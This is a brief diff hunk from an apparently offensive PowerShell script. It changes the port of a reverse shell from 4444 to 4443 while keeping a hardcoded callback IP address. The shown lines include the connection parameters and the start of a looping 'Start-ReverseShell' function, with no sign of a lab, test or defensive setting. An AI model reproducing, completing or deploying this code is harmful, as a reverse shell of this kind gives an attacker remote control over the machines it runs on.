@@ -43,7 +43,7 @@ try {
     
     # TCP Connection parameters
     $ip = "143.110.191.171"
-    $port = 4444
+    $port = 4443
     
     function Start-ReverseShell {
         while($true) {
